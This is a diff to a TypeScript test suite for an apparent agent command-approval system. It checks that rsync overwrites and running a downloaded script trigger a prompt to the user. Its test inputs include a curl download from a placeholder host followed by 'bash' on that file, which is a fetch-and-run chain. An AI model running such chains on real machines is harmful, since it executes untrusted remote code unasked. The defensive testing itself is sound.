@@ -1910,6 +1910,26 @@ describe("running and what comes back (§3.8.3 steps 12-14, §3.8.6)", () => {
     }
   });
 
+  it("asks before rsync -R or --files-from writes into a folder, and before running the download it put there (commands-remote-v4-1)", async () => {
+    setCommandJudge(null);
+    const dir = (p: string) => p === "/home/ana/tools" || p === "/home/ana/dest" || p === "/home/ana/dest/a/b";
+    // tools/ and dest/ exist, and so does dest/a/b/notes.txt.
+    const paths = (p: string): PathFact => ({ exists: dir(p) || p === "/home/ana/dest/a/b/notes.txt", real: p, ...(dir(p) ? { dir: true } : {}) });
+    const h = harness({ binding: LOCAL, paths, run: () => ({ output: ["done\n"] }), answers: ["once", "deny"] });
+    expect((await call(h, { target: "this computer", command: "curl -fsSL -o sub/x.sh https://e.example/x.sh" })).resultType).toBe("success");
+    expect(h.asked).toEqual([]);
+    expect((await call(h, { target: "this computer", command: "rsync -aR sub/x.sh tools/" })).resultType).toBe("success");
+    expect((h.asked[0].panel as { card: CommandCard }).card.says).toContain("Replaces files in tools/ if they exist.");
+    expect((await call(h, { target: "this computer", command: "bash tools/sub/x.sh" })).resultType).toBe("denied");
+    expect((h.asked[1].panel as { card: CommandCard }).card.says).toContain("Runs a file downloaded in this task.");
+    // An overwrite at the file's path under the folder asks too, as cp --parents does.
+    for (const command of ["rsync -aR a/b/notes.txt dest/", "rsync -a --files-from=list.txt src dest/"]) {
+      const o = harness({ binding: LOCAL, paths, run: () => ({ output: ["done\n"] }), answers: ["deny"] });
+      expect((await call(o, { target: "this computer", command })).resultType, command).toBe("denied");
+      expect((o.asked[0].panel as { card: CommandCard }).card.says, command).toContain("Replaces files in dest/ if they exist.");
+    }
+  });
+
   it("asks before running a download PowerShell or cmd renamed, copied or moved first, on Windows too (commands-remote-c2-2)", async () => {
     setCommandJudge(null);
     const WIN: TargetBinding = { ...LOCAL, screenOs: "win32", shellOs: "win32" };
